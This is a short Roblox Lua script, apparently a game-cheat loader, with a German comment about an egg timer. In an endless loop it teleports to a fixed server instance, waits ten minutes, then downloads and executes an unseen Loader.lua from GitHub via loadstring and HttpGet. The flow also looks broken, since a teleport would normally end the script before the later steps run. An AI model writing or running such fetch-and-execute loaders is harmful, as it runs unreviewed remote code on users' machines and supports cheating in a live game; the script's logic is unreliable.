-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 600
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "86db0cab-40a9-4b85-a511-7e9a9ab0e06e")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
